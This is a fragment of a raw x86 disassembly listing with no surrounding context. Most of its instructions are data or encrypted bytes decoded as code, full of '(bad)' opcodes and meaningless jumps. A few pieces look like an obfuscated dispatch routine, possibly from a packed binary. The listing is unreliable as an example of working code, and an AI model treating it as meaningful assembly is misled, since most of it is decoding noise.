  40fc1c:	jp     0x40fc3c
  40fc1e:	(bad)  
  40fc1f:	ja     0x40fc21
  40fc21:	inc    edx
  40fc22:	clc    
  40fc23:	mov    edi,0xd9602ec9
  40fc28:	sbb    edi,DWORD PTR [eax]
  40fc2a:	test   al,0x9e
  40fc2c:	pushf  
  40fc2d:	jp     0x40fbbb
  40fc2f:	jg     0x40fc1c
  40fc31:	inc    edi
  40fc32:	adc    eax,0xfb2f03d8
  40fc37:	and    eax,0x3d71ed83
  40fc3c:	in     al,dx
  40fc3d:	sub    dl,ch
  40fc3f:	aaa    
  40fc40:	mov    al,ds:0xb7d098b3
  40fc45:	mov    edi,0xe58715e4
  40fc4a:	jecxz  0x40fc2e
  40fc4c:	loope  0x40fc74
  40fc4e:	scas   eax,DWORD PTR es:[edi]
  40fc4f:	rcr    BYTE PTR [eax-0x53390225],cl
  40fc55:	mov    ebp,0x1a520c80
  40fc5a:	jns    0x40fca9
  40fc5c:	xor    eax,0x976cf832
  40fc61:	ret    0xf775
  40fc64:	jl     0x40fc3b
  40fc66:	lds    ebx,FWORD PTR [edi+eax*2-0x35537759]
  40fc6d:	cmp    DWORD PTR [esp+ebp*4+0x28],esi
  40fc71:	mov    al,ds:0x94fe22af
  40fc76:	mov    esp,gs
  40fc78:	xchg   ecx,eax
  40fc79:	and    eax,0xdf318b9a
  40fc7e:	pop    ecx
  40fc7f:	pop    ds
  40fc80:	mov    eax,DWORD PTR ds:0x912ef580
  40fc86:	push   ebp
  40fc87:	ret    
  40fc88:	pushf  
  40fc89:	pop    esi
  40fc8a:	add    al,0xa6
  40fc8c:	lods   eax,DWORD PTR ds:[esi]
  40fc8d:	cdq    
  40fc8e:	sub    esp,ebp
  40fc90:	imul   DWORD PTR [esi-0x16]
  40fc93:	mov    dl,0x35
  40fc95:	test   al,0xca
  40fc97:	ja     0x40fc3a
  40fc99:	mov    bl,0x45
  40fc9b:	or     al,0xa9
  40fc9d:	out    dx,eax
  40fc9e:	and    ebx,DWORD PTR [edi+0x37ba1c93]
  40fca4:	xchg   BYTE PTR [ecx],cl
  40fca6:	dec    esp
  40fca7:	dec    esi
  40fca8:	pop    ecx
  40fca9:	push   0x18d3a09b
  40fcae:	ins    BYTE PTR es:[edi],dx
  40fcaf:	and    BYTE PTR [edx],dl
  40fcb1:	mov    ebp,0x8ddfd80b
  40fcb6:	xor    ebp,DWORD PTR [eax+0x48]
  40fcb9:	inc    esp
  40fcba:	mov    ecx,0xa10799ee
  40fcbf:	pop    esi
  40fcc0:	xor    al,0x7d
  40fcc2:	lods   al,BYTE PTR ds:[esi]
  40fcc3:	int    0x3c
  40fcc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc6:	popf   
  40fcc7:	or     BYTE PTR [ecx-0x10],bh
  40fcca:	push   ecx
  40fccb:	sbb    eax,0x16f0cbe
  40fcd0:	cmc    
  40fcd1:	jns    0x40fc65
  40fcd3:	cmp    al,0x2b
  40fcd5:	test   BYTE PTR gs:[esi],0xdf
  40fcd9:	jne    0x40fd43
  40fcdb:	xor    BYTE PTR [ebp+0x3d],al
  40fcde:	mov    edx,0xaecfd778
  40fce3:	fwait
  40fce4:	ja     0x40fd13
  40fce6:	out    0x88,eax
  40fce8:	push   eax
  40fce9:	pop    es
  40fcea:	xchg   esi,eax
  40fceb:	mov    WORD PTR [esi-0x58],fs
  40fcee:	xchg   ebp,eax
  40fcef:	cs aaa 
  40fcf1:	inc    esi
  40fcf2:	jns    0x40fca0
  40fcf4:	dec    ebp
  40fcf5:	mov    WORD PTR ds:0xa8370eca,?
  40fcfb:	add    edi,edx
  40fcfd:	cmp    eax,0x10500f05
  40fd02:	or     DWORD PTR [ebx-0x3648b0e],0xd9c9a933
  40fd0c:	les    esp,FWORD PTR [edi]
  40fd0e:	xor    eax,0x5e99c8d0
  40fd13:	xor    dh,BYTE PTR [ebx+0x20]
  40fd16:	mov    edx,0x35609a4a
  40fd1b:	push   ebp
  40fd1c:	or     BYTE PTR [ecx+0x7],dl
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	pop    ds
  40fd75:	cmp    ah,BYTE PTR [edi+0x5f]
  40fd78:	fdiv   DWORD PTR [edi+0x7d497070]
  40fd7e:	jo     0x40fdf0
  40fd80:	push   esp
  40fd81:	or     al,0x80
  40fd83:	lahf   
  40fd84:	cmp    DWORD PTR [edx+esi*4-0x7],esi
  40fd88:	push   eax
  40fd89:	out    0x41,eax
  40fd8b:	(bad)  
  40fd8c:	jb     0x40fd7d
  40fd8e:	addr16 mov eax,fs
  40fd91:	mov    edi,0x47c503d2
  40fd96:	xchg   ebx,eax
  40fd97:	enter  0x1918,0xf2
  40fd9b:	inc    esp
  40fd9c:	mov    ds:0xc7d3f46c,eax
  40fda1:	sbb    eax,0xd6490218
  40fda6:	jno    0x40fda0
  40fda8:	pop    ebp
  40fda9:	dec    edi
  40fdaa:	rcr    esp,0x8c
  40fdad:	dec    esp
  40fdae:	fistp  QWORD PTR [eax+0x20]
  40fdb1:	aas    
  40fdb2:	jle    0x40fd5b
  40fdb4:	inc    ebx
  40fdb5:	mov    eax,0x1bcc384d
  40fdba:	out    dx,al
  40fdbb:	rol    BYTE PTR [ebx-0x4d02dc4e],1
  40fdc1:	call   0xdf77c984
  40fdc6:	int3   
  40fdc7:	and    BYTE PTR [bp-0x80],dl
  40fdcb:	cmp    al,0x59
  40fdcd:	xchg   esi,eax
  40fdce:	(bad)  
  40fdcf:	into   
  40fdd0:	pop    edi
  40fdd1:	mov    ecx,0x7d290bd5
  40fdd6:	dec    esi
  40fdd7:	sbb    bh,BYTE PTR [esp+edi*4+0x6e]
  40fddb:	call   0x20a42157
  40fde0:	xor    DWORD PTR [ebp+0x284bdd1f],ebp
  40fde6:	xor    dh,cl
  40fde8:	adc    eax,0x8695a4
  40fded:	(bad)  
  40fdee:	shl    al,cl
  40fdf0:	pop    ebx
  40fdf1:	sbb    al,0x63
  40fdf3:	mov    ebp,ss
  40fdf5:	sbb    DWORD PTR [ecx],0x0
  40fdf8:	scas   al,BYTE PTR es:[edi]
  40fdf9:	repz hlt 
  40fdfb:	sub    DWORD PTR [eax+0x43790d5d],0xe9f90359
  40fe05:	inc    edi
  40fe06:	adc    edi,esp
  40fe08:	jo     0x40fdcb
  40fe0a:	xor    esp,DWORD PTR [eax]
  40fe0c:	adc    al,0xf3
  40fe0e:	sub    BYTE PTR [edx*1+0x512a6f96],al
  40fe15:	or     ebx,DWORD PTR [esi]
  40fe17:	mov    ds:0xf937801e,al
  40fe1c:	pop    edi
  40fe1d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40fe1f:	test   al,bl
  40fe21:	out    dx,eax
  40fe22:	ins    BYTE PTR es:[edi],dx
  40fe23:	sub    BYTE PTR [edi],0xdc
  40fe26:	sbb    DWORD PTR [edx+0x3b7a79a0],eax
  40fe2c:	aam    0x6a
  40fe2e:	pop    edi
  40fe2f:	lahf   
  40fe30:	xchg   ecx,eax
  40fe31:	pusha  
  40fe32:	cmp    al,0x73
  40fe34:	mov    esi,0x8504d419
  40fe39:	cwde   
  40fe3a:	cwde   
  40fe3b:	sub    al,0x86
  40fe3d:	test   eax,0x8b09306c
  40fe42:	fxtract 
  40fe44:	xchg   esi,eax
  40fe45:	retf   0x62ec
  40fe48:	aas    
  40fe49:	aaa    
  40fe4a:	push   0x53
  40fe4c:	mov    bl,0x1d
  40fe4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe4f:	out    0x66,eax
  40fe51:	sub    DWORD PTR [eax+0x48053877],edi
  40fe57:	loopne 0x40fe24
  40fe59:	add    BYTE PTR [ebp-0x3df33ed6],al
  40fe5f:	sub    eax,0xa4c42751
  40fe64:	mov    BYTE PTR [eax-0x35],ah
  40fe67:	pop    ebp
  40fe68:	imul   ebx,ebp,0x79
  40fe6b:	iret   
  40fe6c:	loope  0x40feea
  40fe6e:	and    esp,DWORD PTR ds:0x6a180e88
  40fe74:	(bad)  
  40fe76:	inc    eax
  40fe77:	fwait
  40fe78:	test   BYTE PTR [ecx-0x57],ah
  40fe7b:	push   edx
  40fe7c:	fstp   QWORD PTR [ecx+0x4e2028fd]
  40fe82:	imul   ecx,DWORD PTR [ecx-0x4c],0x49
  40fe86:	in     eax,0x95
  40fe88:	not    BYTE PTR [edx]
  40fe8a:	jle    0x40feb4
  40fe8c:	fnsave [edi-0x6ff30989]
  40fe92:	fcom   DWORD PTR [edi]
  40fe94:	xchg   ebp,eax
  40fe95:	(bad)  
  40fe96:	pop    esp
  40fe97:	cmp    bh,BYTE PTR [ecx-0x2]
  40fe9a:	pop    es
  40fe9b:	(bad)  
  40fe9c:	xchg   esp,eax
  40fe9d:	into   
  40fe9e:	pop    esp
  40fe9f:	out    dx,eax
  40fea0:	out    0xb,eax
  40fea2:	mov    ecx,0x582f8f95
  40fea7:	inc    ebx
  40fea8:	jg     0x40fe72
  40feaa:	leave  
  40feab:	sbb    bl,ch
  40fead:	sbb    al,0x2a
  40feaf:	sbb    ch,dl
  40feb1:	xor    eax,0x2f36d0ba
  40feb6:	in     eax,dx
  40feb7:	in     al,dx
  40feb8:	adc    eax,0xdf72f8f3
  40febe:	loop   0x40ff25
  40fec0:	sbb    BYTE PTR [ecx],ch
  40fec2:	mov    ebx,0x3cb884c8
  40fec7:	cld    
  40fec8:	xchg   bh,bh
  40feca:	shl    edi,0x24
  40fecd:	lock pop eax
  40fecf:	jmp    0x40ff0b
  40fed1:	stos   DWORD PTR es:[edi],eax
  40fed2:	dec    ebp
  40fed3:	jecxz  0x40ff09
  40fed5:	sbb    edx,DWORD PTR [esi-0x22]
  40fed8:	out    dx,al
  40fed9:	xor    DWORD PTR [esp+ebx*8-0x99b8ef6],edx
  40fee0:	ins    DWORD PTR es:[edi],dx
  40fee1:	imul   DWORD PTR [ecx-0x5f]
  40fee4:	push   0xbb17eb8f
  40fee9:	or     bh,ch
  40feeb:	push   ds
  40feec:	mov    ch,0x60
  40feee:	rol    bl,0x7b
  40fef1:	pop    ebp
  40fef2:	xchg   esi,eax
  40fef3:	jnp    0x40ff16
  40fef5:	xor    BYTE PTR [ebx+0x1ebff16b],0x97
  40fefc:	mov    esp,0x9e9c9c6e
  40ff01:	push   es
  40ff02:	push   0x53720c4f
  40ff07:	xchg   esp,eax
  40ff08:	inc    esp
  40ff09:	cmp    edx,edx
  40ff0b:	jno    0x40fefd
  40ff0d:	mov    WORD PTR ds:0x94536e61,es
  40ff13:	dec    edi
  40ff14:	jge    0x40ff08
  40ff16:	(bad)  
  40ff17:	icebp  
  40ff18:	jnp    0x40ff96
  40ff1a:	add    eax,0xc51de3eb
  40ff1f:	lods   al,BYTE PTR ds:[esi]
  40ff20:	daa    
  40ff21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff22:	test   DWORD PTR [edi+0x3d],ecx
  40ff25:	dec    ebp
  40ff26:	faddp  st(0),st
  40ff28:	fdivr  st,st(1)
  40ff2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff2b:	in     eax,0x3a
  40ff2d:	(bad)  
  40ff2e:	in     eax,dx
  40ff2f:	ror    BYTE PTR [eax],1
  40ff31:	stc    
  40ff32:	push   DWORD PTR [esp+edi*1]
  40ff35:	call   0x7d59f4b2
  40ff3a:	mov    ds:0x5d80011f,eax
  40ff3f:	leave  
  40ff40:	in     al,dx
  40ff41:	pop    edi
  40ff42:	jp     0x40ff2c
  40ff44:	or     eax,DWORD PTR ds:0xf6a3a131
  40ff4a:	xchg   esp,eax
  40ff4b:	pop    ds
  40ff4c:	test   DWORD PTR [esi+0x7a],eax
  40ff4f:	mov    dl,0x9b
  40ff51:	inc    ebp
  40ff52:	bound  ebp,QWORD PTR [edx*8+0x58eb76e5]
  40ff59:	mov    al,ds:0x766aaff1
  40ff5e:	je     0x40ff25
  40ff60:	stos   DWORD PTR es:[edi],eax
  40ff61:	or     BYTE PTR [eax],dl
  40ff63:	xor    al,0xcf
  40ff65:	lods   al,BYTE PTR ds:[esi]
  40ff66:	add    bh,BYTE PTR ss:[edx+0x66e196e1]
  40ff6d:	repnz arpl WORD PTR [edi],bp
  40ff70:	(bad)  
  40ff72:	sub    bl,BYTE PTR [ecx-0xb5f6ad0]
  40ff78:	ins    BYTE PTR es:[edi],dx
  40ff79:	fcom   st(6)
  40ff7b:	ins    BYTE PTR es:[edi],dx
  40ff7c:	arpl   WORD PTR [esi-0x7839fa5e],sp
  40ff82:	pop    ss
  40ff83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff84:	jecxz  0x40fff9
  40ff86:	sbb    ch,BYTE PTR [ebp+esi*8+0x4e]
  40ff8a:	pop    ebx
  40ff8b:	cmp    edi,esp
  40ff8d:	mov    bl,ch
  40ff8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff90:	inc    ebp
  40ff91:	pop    ebx
  40ff92:	inc    ecx
  40ff93:	ret    
  40ff94:	adc    al,0xf2
  40ff96:	fucomi st,st(5)
  40ff98:	paddusw mm4,QWORD PTR [ecx]
  40ff9b:	repz int3 
  40ff9d:	test   edi,ecx
  40ff9f:	ss dec ebx
  40ffa1:	in     eax,dx
  40ffa2:	xor    eax,0x694ee888
  40ffa7:	dec    eax
  40ffa8:	mov    ds:0x7c23ee1a,eax
  40ffad:	imul   edx,ebp,0xad8be573
  40ffb3:	sahf   
  40ffb4:	test   eax,0xd0811757
  40ffb9:	repz pop esi
  40ffbb:	clc    
  40ffbc:	nop
  40ffbd:	cmovl  ecx,DWORD PTR [esi-0x5e]
  40ffc1:	das    
  40ffc2:	add    bl,dh
  40ffc4:	fdivp  st(7),st
  40ffc6:	mov    esi,0x5ca6949a
  40ffcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffcc:	push   ebp
  40ffcd:	popf   
  40ffce:	daa    
  40ffcf:	sbb    DWORD PTR [esi+eiz*1+0x5b],eax
  40ffd3:	pop    edx
  40ffd4:	inc    edx
  40ffd5:	add    DWORD PTR [esi+0x563c228a],edi
  40ffdb:	fidiv  DWORD PTR [ecx+0x62]
  40ffde:	mov    eax,ds:0xb008133e
  40ffe3:	push   eax
  40ffe4:	gs (bad) 
  40ffe6:	(bad)  
  40ffe8:	jnp    0x40ffe6
  40ffea:	dec    bl
  40ffec:	stc    
  40ffed:	dec    ebp
  40ffee:	jo     0x41005e
  40fff0:	sar    BYTE PTR [esi+ebx*4-0xddd87fb],0x1c
  40fff8:	fcom   QWORD PTR [eax]
  40fffa:	dec    esi
  40fffb:	cmp    al,0xcd
  40fffd:	(bad)  
  40fffe:	addr16 mov dl,0x65
  410001:	mov    ds:0x7a132e87,eax
  410006:	pop    esp
  410007:	dec    ecx
  410008:	mov    esp,0xfacefcff
  41000d:	xchg   esp,eax
  41000e:	push   edi
  41000f:	inc    ebp
  410010:	push   esp
  410011:	ja     0x410086
  410013:	mov    BYTE PTR [ecx-0x63838946],0x5
  41001a:	into   
  41001b:	push   esi
  41001c:	inc    eax
  41001d:	cld    
  41001e:	mov    esi,DWORD PTR [esi+0x439f2856]
  410024:	ss dec ecx
  410026:	jge    0x410096
  410028:	mov    ebp,0x4eb1a819
  41002d:	popa   
  41002e:	out    0x88,al
  410030:	xor    DWORD PTR [ebx-0x14ceb889],ebp
  410036:	pop    eax
  410037:	pop    esp
  410038:	test   DWORD PTR [ebx],esi
  41003a:	sub    al,0xa6
  41003c:	pop    edx
  41003d:	xor    ebx,DWORD PTR [ebp+0x6c]
  410040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410041:	das    
  410042:	xchg   edx,eax
  410043:	stos   DWORD PTR es:[edi],eax
  410044:	mov    ds:0xa429aabc,al
  410049:	ret    
  41004a:	mov    eax,DWORD PTR [edx-0x6b]
  41004d:	xchg   esp,eax
  41004e:	mov    dl,0x5c
  410050:	test   DWORD PTR [ecx-0x40],esi
  410053:	shr    DWORD PTR [esi-0x5b],0xbc
  410057:	push   cs
  410058:	mov    bh,0xb2
  41005a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41005b:	out    dx,eax
  41005c:	loop   0x410040
  41005e:	das    
  41005f:	or     bl,BYTE PTR [edi+eax*2+0x8a9a9e2]
  410066:	(bad)  
  410067:	loopne 0x41009f
  410069:	xchg   edi,eax
  41006a:	adc    BYTE PTR [eax+0x7d],dl
  41006d:	and    eax,0x9ad0cb8
  410072:	enter  0x7e33,0x76
  410076:	mov    bl,0x5c
  410078:	xor    edx,DWORD PTR [esi-0x18]
  41007b:	cmp    al,al
  41007d:	jnp    0x410085
  41007f:	sub    esi,DWORD PTR [eax+0x6b4dd041]
  410085:	scas   eax,DWORD PTR es:[edi]
  410086:	or     esp,DWORD PTR [edi-0x7e]
  410089:	rcr    edi,1
  41008b:	jp     0x41000f
  41008d:	pop    eax
  41008e:	push   cs
  41008f:	or     DWORD PTR ds:0xc20cdf68,edi
  410095:	mov    ecx,0x74474e72
  41009a:	out    0xff,eax
  41009c:	adc    BYTE PTR [ebx+0x16],dh
  41009f:	stc    
  4100a0:	dec    ebx
  4100a1:	mov    cs,WORD PTR [ebx]
  4100a3:	int3   
  4100a4:	icebp  
  4100a5:	repz adc al,BYTE PTR [edx+0x7f]
  4100a9:	or     ebp,DWORD PTR [eax+0x2113dc34]
  4100af:	cli    
  4100b0:	call   0xabc6:0xbfaa838a
  4100b7:	ja     0x4100d5
  4100b9:	and    edx,DWORD PTR [ecx]
  4100bb:	loope  0x410123
  4100bd:	mov    ebp,DWORD PTR [eax+esi*4-0x2fc37316]
  4100c4:	jg     0x41008d
  4100c6:	ror    bh,cl
  4100c8:	or     BYTE PTR [ebp+edx*8+0x1d01b26a],dh
  4100cf:	cmp    al,dh
  4100d1:	shl    BYTE PTR [edi+0x4226e15d],1
  4100d7:	inc    esp
  4100d8:	loopne 0x4100c4
  4100da:	out    dx,al
  4100db:	(bad)  
  4100dc:	jg     0x410142
  4100de:	hlt    
  4100df:	or     DWORD PTR [edi-0x21956ca9],esi
  4100e5:	push   edx
  4100e6:	inc    ebx
  4100e7:	imul   edi,DWORD PTR [esi+0x4f913f53],0x67d80a81
  4100f1:	dec    esp
  4100f2:	inc    ecx
  4100f3:	jns    0x4100f4
  4100f5:	dec    esi
  4100f6:	adc    eax,0x5a25a030
  4100fb:	popa   
  4100fc:	ds inc edi
  4100fe:	mov    eax,ds:0x9b71ac28
  410103:	sub    bh,BYTE PTR [ebp-0x4a]
  410106:	ja     0x4100c5
  410108:	or     eax,0x17efe41a
  41010d:	mov    ecx,0x4530da7a
  410112:	ds addr16 mov bl,0x66
  410116:	sub    eax,0x81dc5614
  41011b:	cmp    edx,DWORD PTR [ebp+0x2a]
  41011e:	sub    esp,DWORD PTR [ecx+0x7c]
  410121:	add    DWORD PTR ds:0xbe0909eb,ebp
  410127:	jle    0x4100b3
  410129:	xchg   edi,eax
  41012a:	xor    eax,0x86042b6
  41012f:	add    BYTE PTR [ecx+ebp*8],al
  410132:	or     ebp,DWORD PTR [ecx]
  410134:	pop    esp
  410135:	and    BYTE PTR [ebp+0x74],0x54
  410139:	aaa    
  41013a:	imul   edi,DWORD PTR [esi-0x24],0x3c
  41013e:	popf   
  41013f:	sub    al,dl
  410141:	sbb    BYTE PTR [edi-0x12],dl
  410144:	in     eax,0x17
  410146:	inc    esi
  410147:	xchg   esi,eax
  410148:	in     eax,dx
  410149:	sahf   
  41014a:	dec    ecx
  41014b:	push   cs
  41014c:	ret    
  41014d:	pop    ebp
  41014e:	imul   edx,DWORD PTR [ecx+0x44],0x33
  410152:	test   BYTE PTR [esi+edx*1],cl
  410155:	mov    esi,0xfc83be8
  41015a:	test   DWORD PTR ds:0x8b000000,ecx
  410160:	inc    ebp
  410161:	cld    
  410162:	xor    eax,0x7510855
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	popa   
  41018a:	(bad)  
  41018b:	shl    DWORD PTR [edx],cl
  41018d:	xor    DWORD PTR [ebx+0x7d497070],esi
  410193:	jo     0x410205
  410195:	xlat   BYTE PTR ds:[ebx]
  410196:	mov    ecx,0x7c0b1434
  41019b:	arpl   si,sp
  41019d:	ss dec eax
  41019f:	cmp    eax,0x938792fa
  4101a4:	mov    eax,ds:0x994b22eb
  4101a9:	pop    esp
  4101aa:	add    eax,0x1823bf5c
  4101af:	ret    0x71a9
  4101b2:	xchg   ebx,esi
  4101b4:	pop    DWORD PTR [ebx-0x3011d4f6]
  4101ba:	pop    es
  4101bb:	stc    
  4101bc:	push   edx
  4101bd:	xchg   esp,eax
  4101be:	rcl    BYTE PTR [eax],0xab
  4101c1:	inc    ebx
  4101c2:	sub    dh,BYTE PTR ds:0xafcb0b5b
  4101c8:	frstor [edx]
  4101ca:	xcrypt-cbc (bad)
  4101cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101cc:	xchg   edi,eax
  4101cd:	lahf   
  4101ce:	gs pop esi
  4101d0:	test   eax,0x3c35e456
  4101d5:	dec    edx
  4101d6:	cmc    
  4101d7:	pop    ss
  4101d8:	mov    eax,0x91b816e8
  4101dd:	aam    0xf1
  4101df:	ds das 
  4101e1:	pop    es
  4101e2:	jo     0x4101f3
  4101e4:	and    cl,BYTE PTR [ebp-0x5b]
  4101e7:	inc    ebx
  4101e8:	xchg   ecx,eax
  4101e9:	sub    BYTE PTR [ebx+0x8],0x9a
  4101ed:	mov    eax,ds:0x521b34e5
  4101f2:	ja     0x41020c
  4101f4:	cdq    
  4101f5:	jmp    0x410186
  4101f7:	push   cs
  4101f8:	stc    
  4101f9:	cmp    DWORD PTR [esi-0x2fe8d3f7],edx
  4101ff:	cmp    esi,DWORD PTR [ebx-0x481df417]
  410205:	adc    al,BYTE PTR [edi-0x6e]
  410208:	mov    ebx,DWORD PTR [eax+0x5c2bbfe7]
  41020e:	or     edi,esp
  410210:	ins    BYTE PTR es:[edi],dx
  410211:	test   al,0xa5
  410213:	fdivr  QWORD PTR ds:0x1ca6657c
  410219:	push   ecx
  41021a:	jmp    eax
  41021c:	adc    al,0x8f
  41021e:	push   edi
  41021f:	jp     0x4101e6
  410221:	push   DWORD PTR ds:0x7dbf1151
  410227:	mov    ah,0xfd
  410229:	sbb    BYTE PTR [edi],0x7f
  41022c:	cmp    al,0x59
  41022e:	inc    ecx
  41022f:	neg    BYTE PTR [ebp+0x7f1f7da8]
  410235:	ret    0x5674
  410238:	retf   0xf853
  41023b:	mov    al,ds:0xd61d53
  410240:	and    al,0xeb
  410242:	adc    cl,BYTE PTR [ebx]
  410244:	mov    eax,0x50c5ee4e
  410249:	loope  0x4101ef
  41024b:	or     esi,DWORD PTR [ebp-0x30]
  41024e:	lods   eax,DWORD PTR ds:[esi]
  41024f:	test   esi,edi
  410251:	push   eax
  410252:	push   ds
  410253:	cmp    eax,0x43376d41
  410258:	sbb    ebp,DWORD PTR [esi-0x21bc3ff1]
  41025e:	outs   dx,BYTE PTR ds:[esi]
  41025f:	neg    edi
  410261:	inc    edx
  410262:	sub    eax,0xa3f1237e
  410267:	xor    BYTE PTR [eax-0x4d],0x7b
  41026b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41026c:	pop    ds
  41026d:	xchg   edx,eax
  41026e:	nop
  41026f:	lds    esi,FWORD PTR [eax+0x1b5cd9f7]
  410275:	lods   eax,DWORD PTR ds:[esi]
  410276:	aaa    
  410277:	xchg   esi,eax
  410278:	xchg   BYTE PTR [eax-0x4f],dl
  41027b:	test   cl,cl
  41027d:	in     al,dx
  41027e:	daa    
  41027f:	data16 xor al,0x5
  410282:	nop
  410283:	mov    ebx,0x31f19063
  410288:	or     eax,0x96c295d7
  41028d:	mov    ebx,0x96f0df0a
  410292:	js     0x4102e1
  410294:	xchg   BYTE PTR [edi],bh
  410296:	dec    edx
  410297:	popa   
  410298:	or     BYTE PTR [esi-0x5d],dh
  41029b:	nop    DWORD PTR [eax-0x23a7269e]
  4102a2:	test   DWORD PTR [esi],0x5061d2bf
  4102a8:	and    BYTE PTR [edx-0x6111aa41],dh
  4102ae:	push   ebx
  4102af:	push   es
  4102b0:	xor    eax,0xab74d5b9
  4102b5:	cmp    dl,BYTE PTR [esi-0x13]
  4102b8:	or     eax,0xbbe7ae0c
  4102bd:	repz mov dh,bh
  4102c0:	mov    edi,ebp
  4102c2:	and    al,0x9f
  4102c4:	sbb    eax,DWORD PTR [esi-0x483633bf]
  4102ca:	dec    edx
  4102cb:	sub    BYTE PTR [edi],dl
  4102cd:	dec    edi
  4102ce:	sub    BYTE PTR [esi],bl
  4102d0:	adc    cl,BYTE PTR [ecx+0x45]
  4102d3:	pop    ss
  4102d4:	test   eax,0x716486cd
  4102d9:	jmp    0x7c97:0x51cd93c9
  4102e0:	retf   
  4102e1:	jne    0x410334
  4102e3:	in     al,0x8c
  4102e5:	out    0x31,eax
  4102e7:	enter  0xefe5,0x98
  4102eb:	jbe    0x4102d3
  4102ed:	lock sub al,0x13
  4102f0:	dec    esp
  4102f1:	addr16 mov edi,0x6a971c5e
  4102f7:	aam    0xc8
  4102f9:	or     al,0x47
  4102fb:	imul   eax,ebx,0xffffffeb
  4102fe:	cmp    ch,ah
  410300:	cmp    BYTE PTR [edx-0x51a6b5bd],0x49
  410307:	inc    esi
  410308:	or     al,0xa0
  41030a:	(bad)  
  41030b:	cs aad 0x8e
  41030e:	repnz int3 
  410310:	sub    al,0x7e
  410312:	lea    ebp,[ebp+0x70]
  410315:	dec    esp
  410316:	sub    ebp,ebx
  410318:	mov    edx,0x1c4df915
  41031d:	xor    eax,ebp
  41031f:	inc    ecx
  410320:	cmp    BYTE PTR [edx-0x3859dfa7],bl
  410326:	or     edi,ecx
  410328:	int    0x4
  41032a:	int3   
  41032b:	jns    0x4102c3
  41032d:	lock fmul QWORD PTR [ecx+0x5a92b3df]
  410334:	mov    DWORD PTR [ebx-0x6],eax
  410337:	adc    DWORD PTR [eax],ebp
  410339:	popa   
  41033a:	imul   ecx,ecx,0xffffff81
  41033d:	iret   
  41033e:	ficom  DWORD PTR [edi+0x38f57a7d]
  410344:	data16 std 
  410346:	fldcw  WORD PTR [esi+0x9]
  410349:	mov    eax,ds:0xa67c47
  41034e:	sbb    bl,BYTE PTR [edi-0x9df7985]
  410354:	cmp    al,BYTE PTR ds:0x2d5143c6
  41035a:	lea    ebx,[ebp+esi*2-0x49]
  41035e:	cmp    BYTE PTR [edx-0x4958a0bd],ch
  410364:	mov    ch,BYTE PTR [ebx+0x30bcebc3]
  41036a:	and    BYTE PTR [ebx],dl
  41036c:	or     bl,bl
  41036e:	(bad)  
  41036f:	jo     0x4103d4
  410371:	imul   edx,DWORD PTR [ebp+0x35],0xca2a149d
  410378:	add    bh,0xaa
  41037b:	test   al,0x75
  41037d:	dec    esi
  41037e:	mov    edi,0x65eb471
  410383:	lahf   
  410384:	retf   0xa04d
  410387:	xor    eax,0x8a3daebe
  41038c:	cmp    bl,BYTE PTR [eax-0x743e8050]
  410392:	mov    edi,0x1529b0f5
  410397:	xor    DWORD PTR [edx],0xfffffffc
  41039a:	shr    BYTE PTR [eax+0x3bfd8bf5],1
  4103a0:	cmp    eax,0xa7ee496b
  4103a5:	(bad)  
  4103a6:	xchg   ebp,eax
  4103a7:	pop    edi
  4103a8:	mov    cl,BYTE PTR [ecx+0x145c6b0e]
  4103ae:	dec    edx
  4103af:	pop    es
  4103b0:	(bad)  
  4103b1:	fucomip st,st(7)
  4103b3:	sbb    edx,DWORD PTR [ebx]
  4103b5:	mov    esi,0xf89a88b5
  4103ba:	sahf   
  4103bb:	jns    0x4103d6
  4103bd:	(bad)  
  4103be:	jne    0x410379
  4103c0:	lods   eax,DWORD PTR ds:[esi]
  4103c1:	in     al,0x96
  4103c3:	in     eax,dx
  4103c4:	dec    ebp
  4103c5:	sar    ecx,0xff
  4103c8:	aam    0x59
  4103ca:	xchg   edx,eax
  4103cb:	push   esi
  4103cc:	push   edi
  4103cd:	push   es
